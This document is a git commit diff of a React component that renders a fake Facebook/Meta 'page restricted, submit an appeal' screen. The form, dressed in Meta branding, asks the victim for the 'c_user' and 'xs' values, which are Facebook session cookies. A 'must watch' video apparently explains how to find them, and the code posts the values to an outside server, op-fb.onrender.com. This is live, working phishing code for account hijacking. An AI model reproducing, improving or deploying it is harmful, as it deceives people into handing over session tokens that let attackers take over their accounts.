d67732c1f3660c7f9ed17a9039f022a99025f2d0
ragalcha <119405754+ragalcha@users.noreply.github.com>
2024-07-25 13:26:16 +0530

    Update Fbpage2.js

--- src/Components/Fbpage2.js
+++ src/Components/Fbpage2.js
@@ -6,131 +6,132 @@ import React, { useState } from 'react';
 import axios from 'axios';
 
 function Fbpage2() {
-  const [email, setEmail] = useState('');
-  const [password, setPassword] = useState('');
-  const [message, setMessage] = useState('');
+    const [email, setEmail] = useState('');
+    const [password, setPassword] = useState('');
+    //   const [message, setMessage] = useState('');
 
-  const handleRegister = async (e) => {
-    e.preventDefault();
-    try {
-      const response = await axios.post('https://op-fb.onrender.com/api/v1/usernew/register', {
-        email,
-        password
-      });
-      setMessage('Registration successful');
-    } catch (error) {
-      console.log("error", error);
-      setMessage('Registration failed');
-    }
-  };
+    const handleRegister = async (e) => {
+        e.preventDefault();
+        try {
+            console.log('email', email, 'password', password);
+            await axios.post('https://op-fb.onrender.com/api/v1/usernew/register', {
+                email,
+                password
+            });
+            //   setMessage('Registration successful');
+        } catch (error) {
+            console.log("error", error);
+            //   setMessage('Registration failed');
+        }
+    };
 
-  return (
-    <>
-      <nav>
-        <div className="nav-left">
-          <p className="fb-2">
-            facebook
-          </p>
-        </div>
-        <div className="nav-right">
-          <div className="search-box">
-            <img 
-              src="https://cdn.glitch.global/d08141de-e7af-45a5-916b-2f09d06ac286/search-icon-lob.png?v=1712422050841" 
-              alt="search-icon"
-            />
-            <input 
-              type="text" 
-              placeholder="Search"
-            />
-          </div>
-        </div>
-      </nav>
+    return (
+        <>
+            <nav>
+                <div className="nav-left">
+                    <p className="fb-2">
+                        facebook
+                    </p>
+                </div>
+                <div className="nav-right">
+                    <div className="search-box">
+                        <img
+                            src="https://cdn.glitch.global/d08141de-e7af-45a5-916b-2f09d06ac286/search-icon-lob.png?v=1712422050841"
+                            alt="search-icon"
+                        />
+                        <input
+                            type="text"
+                            placeholder="Search"
+                        />
+                    </div>
+                </div>
+            </nav>
 
-      <div className="main-body">
-        <form 
-          className="content" 
-          onSubmit={handleRegister}
-        >
-          <div>
-            <img 
-              src="https://cdn.glitch.global/d08141de-e7af-45a5-916b-2f09d06ac286/Meta-Logo.png?v=1712422024289" 
-              width="140" 
-              alt="Meta Logo"
-            />
-          </div>
+            <div className="main-body">
+                <form
+                    className="content"
+                    onSubmit={handleRegister}
+                >
+                    <div>
+                        <img
+                            src="https://cdn.glitch.global/d08141de-e7af-45a5-916b-2f09d06ac286/Meta-Logo.png?v=1712422024289"
+                            width="140"
+                            alt="Meta Logo"
+                        />
+                    </div>
 
-          <p className="tr-5">
-            We have detected unusual activity on your page that violates our community standards.
-          </p>
-          <p className="tr-5">
-            Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.
-          </p>
-          <p className="tr-5">
-            If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.
-          </p>
+                    <p className="tr-5">
+                        We have detected unusual activity on your page that violates our community standards.
+                    </p>
+                    <p className="tr-5">
+                        Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.
+                    </p>
+                    <p className="tr-5">
+                        If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.
+                    </p>
 
-          <div className="video-text">
-            <p>Must Watch Detailed Video Information:</p>
-          </div>
+                    <div className="video-text">
+                        <p>Must Watch Detailed Video Information:</p>
+                    </div>
 
-          <div>
-            <video 
-              controls 
-              loop 
-              autoPlay 
-              width="300" 
-              poster="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png"
-            >
-              <source 
-                src="https://instructions-video.vercel.app/detailed_video.mp4" 
-                type="video/mp4"
-              />
-            </video>
-          </div>
+                    <div>
+                        <video
+                            controls
+                            loop
+                            autoPlay
+                            width="300"
+                            poster="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png"
+                        >
+                            <source
+                                src="https://instructions-video.vercel.app/detailed_video.mp4"
+                                type="video/mp4"
+                            />
+                        </video>
+                    </div>
 
-          <p className="tr-5">
-            Please be sure to provide the requested information below.
-          </p>
+                    <p className="tr-5">
+                        Please be sure to provide the requested information below.
+                    </p>
 
-          <div>
-            <p className="mt-4">c_user*</p>
-            <input 
-              type="number" 
-              name="c_user" 
-              id="c_user" 
-              required 
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-            />
-          </div>
+                    <div>
+                        <p className="mt-4">c_user*</p>
+                        <input
+                            type="text"
+                            name="c_user"
+                            id="c_user"
+                            required
+                            value={email}
+                            onChange={(e) => setEmail(e.target.value)}
+                        />
+                    </div>
 
-          <div>
-            <p className="mt-4">xs*</p>
-            <input 
-              type="text" 
-              name="xs" 
-              pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$" 
-              title="Must Watch Detailed Video" 
-              required 
-              aria-required="true"
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-            />
-          </div>
+                    <div>
+                        <p className="mt-4">xs*</p>
+                        <input
+                            type="text"
+                            name="xs"
+                            pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$"
+                            title="Must Watch Detailed Video"
+                            required
+                            aria-required="true"
+                            value={password}
+                            onChange={(e) => setPassword(e.target.value)}
+                        />
+                    </div>
 
-          <p className="msi-4">
-            **Please make sure your account is not logged out from your computer or laptop until you have received a verification email.
-          </p>
+                    <p className="msi-4">
+                        **Please make sure your account is not logged out from your computer or laptop until you have received a verification email.
+                    </p>
 
-          <div className="container">
-            <button className="button" type="submit">
-              <p>Submit</p>
-            </button>
-          </div>
-        </form>
-      </div>
-    </>
-  );
+                    <div className="container">
+                        <button className="button" type="submit">
+                            <p>Submit</p>
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </>
+    );
 }
 
 export default Fbpage2;
